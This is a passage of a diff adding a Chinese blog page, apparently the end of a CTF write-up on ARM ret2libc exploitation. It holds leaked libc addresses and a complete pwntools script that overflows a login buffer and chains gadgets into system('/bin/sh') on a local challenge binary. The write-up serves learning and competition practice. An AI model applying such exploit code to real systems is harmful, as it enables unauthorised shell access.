class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011211350316.png" alt="image-20251011211350316"></p>
+<p>可见libc已经成功泄露了</p>
+<p>接下来比较投机取巧。按照常理，应该在payload后面添加返回地址进行二次读，但是尝试多次后，发现无法跳转，但是尝试过程发现libc基地址是不变的（比赛过程远程环境也没有变）。利用这一特性，直接在新的脚本(也可以在下面直接接着写)，按照泄露libc的方式，填入/bin/sh和system地址</p>
+<p>本地测试时，地址如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] system 地址 0x408823d4</span><br><span class="line">[+] /bin/sh 地址 0x409aa0dc</span><br><span class="line">[+] libc 基地址 0x4083c000</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># p = process([&#x27;qemu-arm&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;./login_system_patch&#x27;])</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./login_system_patch&#x27;</span>])</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./login_system&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_r3_pc_addr = <span class="number">0x10730</span></span><br><span class="line">mov_r0_r3_pop_r11_pc_addr = <span class="number">0x106c0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">260</span>-<span class="number">5</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc_addr)</span><br><span class="line">payload1 += p32(<span class="number">0x409aa0dc</span>)</span><br><span class="line">payload1 += p32(mov_r0_r3_pop_r11_pc_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x408823d4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Username:&quot;</span>, payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Password:&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>利用成功：</p>
+<p><img src="https://image.gubaiovo.com/blog/post_img/ctf/ARM%E6%9E%B6%E6%9E%84PWNret2libc%E5%88%9D%E6%8E%A2/image-20251011212138352.png" alt="image-20251011212138352"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/gubaiovo">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">链接</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ARM 架构 PWN ret2libc初探</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARM-%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">ARM 寄存器和汇编基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">基础汇编</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lr%E3%80%81sp%E3%80%81pc%E4%B8%89%E5%A4%A7%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">lr、sp、pc三大寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">32位寄存器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">程序分析与攻击</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.gubaiovo.com/posts/b988d4f6.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.gubaiovo.com/posts/b988d4f6.html&text=ARM 架构 PWN ret2libc初探"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.gubaiovo.com/posts/b988d4f6.html&is_video=false&description=ARM 架构 PWN ret2libc初探"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ARM 架构 PWN ret2libc初探&body=Check out this article: https://www.gubaiovo.com/posts/b988d4f6.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.gubaiovo.com/posts/b988d4f6.html&title=ARM 架构 PWN ret2libc初探"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.gubaiovo.com/posts/b988d4f6.html&name=ARM 架构 PWN ret2libc初探&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.gubaiovo.com/posts/b988d4f6.html&t=ARM 架构 PWN ret2libc初探"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    gubai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/gubaiovo">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">链接</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
